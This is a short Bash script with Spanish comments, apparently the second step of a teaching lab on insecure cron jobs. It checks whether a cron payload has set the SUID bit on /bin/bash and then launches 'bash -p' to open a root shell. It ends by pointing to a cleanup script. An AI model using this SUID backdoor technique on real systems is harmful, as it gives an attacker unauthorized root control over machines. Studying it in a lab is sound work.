#!/bin/bash
# 02_verify_exploit.sh - Script para verificar el éxito de la explotación de Cron
# Este script DEBE ejecutarse DESPUÉS de esperar la ejecución del cron job.

echo "--- Verificando el éxito de la explotación de Cron Inseguro ---"

# --- Paso 1: Verificar el bit SUID en /bin/bash ---
echo "[1/2] Verificando si /bin/bash ahora tiene el bit SUID..."
ls -la /bin/bash | grep "rws"

if [ $? -eq 0 ]; then
    echo "    ¡'/bin/bash' ahora tiene el bit SUID! (rwsr-xr-x)."
    echo "    Esto significa que el payload de cron se ejecutó como root."
    echo "[2/2] Intentando obtener una shell de root..."
    echo "    Escribe 'exit' para salir de la shell de root."
    echo ""
    /bin/bash -p # Ejecuta bash con los privilegios del bit SUID (root)
    echo ""
    echo "Si viste 'root@...' y un prompt diferente, ¡felicidades! Has escalado."
else
    echo "ERROR: '/bin/bash' NO tiene el bit SUID. El payload no se ejecutó o falló."
    echo "    Asegúrate de haber esperado al menos 60 segundos después de ejecutar '01_exploit.sh'."
    echo "    Revisa los permisos del directorio vulnerable y la tarea cron."
fi

echo "--- Verificación completada. ---"
echo "Ahora, ejecuta './03_revert_fix.sh' con 'sudo' para limpiar el laboratorio."
